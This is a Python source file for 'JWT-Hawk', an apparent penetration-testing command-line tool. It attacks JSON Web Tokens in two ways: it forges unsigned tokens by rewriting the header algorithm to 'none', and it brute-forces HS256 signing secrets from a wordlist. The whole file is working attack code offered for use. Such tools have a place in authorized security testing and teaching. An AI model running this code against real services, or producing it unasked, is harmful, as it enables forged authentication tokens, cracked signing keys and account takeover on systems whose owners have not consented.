import jwt
import sys
import colorama
from colorama import Fore
from rich.console import Console
from rich.text import Text
import base64
import json

# Initialize colorama
colorama.init(autoreset=True)

# Create a Console instance for rich
console = Console()

def print_banner():
    """Prints the banner for the JWT-Hawk tool."""
    banner_text = "JWT-Hawk - Decode JWT Tokens"
    banner = Text(banner_text, style="cyan bold underline")  # Added underline for emphasis
    console.print(banner, style="bold cyan on black")  # Print with background for more emphasis
    console.print(Text("A tool for decoding JWT tokens using a list of secrets.", style="yellow"))
    console.print(Text("Version 2.0", style="magenta"))
    console.print(Text("RedHawks Cyber Research Tool by DL28", style="white"))
    print("\n")

def handle_none(jwt_token):
    """Handles the 'none' functionality for JWT processing."""
    header, payload, signature = jwt_token.split('.')
    
    # Decode the header
    header_json = json.loads(base64.urlsafe_b64decode(header + '==').decode('utf-8'))
    
    # Create a new header with only the alg value set to 'none'
    new_header_json = {
        'alg': 'none'
    }
    
    # Encode the modified header back to base64
    modified_header = base64.urlsafe_b64encode(json.dumps(new_header_json).encode('utf-8')).decode('utf-8').rstrip("=")
    
    # Return the modified JWT without the signature
    return f"{modified_header}.{payload}."

# Extract and Print the Header Values
def JWTHeaderExtract(jwt_token):
    print("[##] JWT Header Values:\n")
    jwt_header = jwt.get_unverified_header(jwt_token)
    for Hkey, Hvalue in jwt_header.items():
        print(Fore.GREEN + f"{Hkey} ---- {Hvalue}")

# Extract and Print the Payload Values, if the Secret matches
def JWTPayloadwithSecret(jwt_token, secretsList):
    for secret in secretsList:
        try:
            decoded_payload = jwt.decode(jwt_token, secret.strip(), algorithms=["HS256"])
            print("\n[##] JWT Payload Values:\n")
            for key, value in decoded_payload.items():
                print(Fore.GREEN + f"{key} ---- {value}")
            print("\n[##] JWT Decoded Signature:\n")
            print(Fore.RED + f"{secret.strip()}")
            return secret.strip()  # Return the successful secret
        except jwt.InvalidTokenError:
            continue  # Continue if the token is invalid


def print_help():
    """Prints the help information for using the JWT-Hawk tool."""
    help_text = """
    JWT-Hawk - Decode JWT Tokens

    Usage:
        python3 jwt-hawk.py <mode> [options]

    Modes:
        none    - Process a JWT token with 'alg' set to 'none'.
        brute   - Attempt to brute-force decode a JWT token using a list of secrets.

    Options for 'brute':
        <secrets_file> - Path to the file containing a list of secrets to try.

    Example:
        python3 jwt-hawk.py none
        python3 jwt-hawk.py brute sample-secrets.txt

    Note:
        Make sure to provide a valid JWT token when using the 'none' mode.
    """
    print(help_text)

# Prompt user for JWT token input and file name of secret list        
def main():
    print_banner()  # Call the banner function at the start of main
    try:
        if len(sys.argv) < 2:
            print(Fore.RED + "Please provide an argument: 'none', 'brute', or 'help'.")
            return
        
        mode = sys.argv[1].lower()  # Normalize input to lowercase
        
        if mode == "help":
            print_help()
            return
        
        if mode == "none":
            jwt_token = input("JWT Token: ")
            if not jwt_token:
                print(Fore.RED + "JWT Token cannot be empty.")
                return
            
            modified_jwt = handle_none(jwt_token)
            print(Fore.YELLOW + f"Modified JWT (alg set to 'none'): {modified_jwt}")
        
        elif mode == "brute":
            if len(sys.argv) < 3:
                print(Fore.RED + "Please provide the sample text file for brute force.")
                return
            
            file_name = sys.argv[2]
            with open(file_name) as secretFile:
                secretsList = secretFile.readlines()
            print(f"Total Secrets to be attempted: {len(secretsList)}\n") 
            
            # Prompt for JWT token for brute force decoding
            jwt_token = input("JWT Token for brute force: ")
            if jwt_token:
                JWTHeaderExtract(jwt_token=jwt_token)
                successful_secret = JWTPayloadwithSecret(jwt_token=jwt_token, secretsList=secretsList)
                if successful_secret:
                    print(f"[##] Successfully decoded with secret: {successful_secret}")
                else:
                    print(Fore.RED + "Sorry, Did not find any Secret to Decode.")
            else:
                print(Fore.YELLOW + "No JWT token provided for brute force decoding.")
        
        else:
            print(Fore.RED + "Invalid argument. Use 'none', 'brute', or 'help'.")

    except IndexError:
        print(Fore.RED + "Please provide the secret file name as an argument.")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

if __name__ == "__main__":
    main()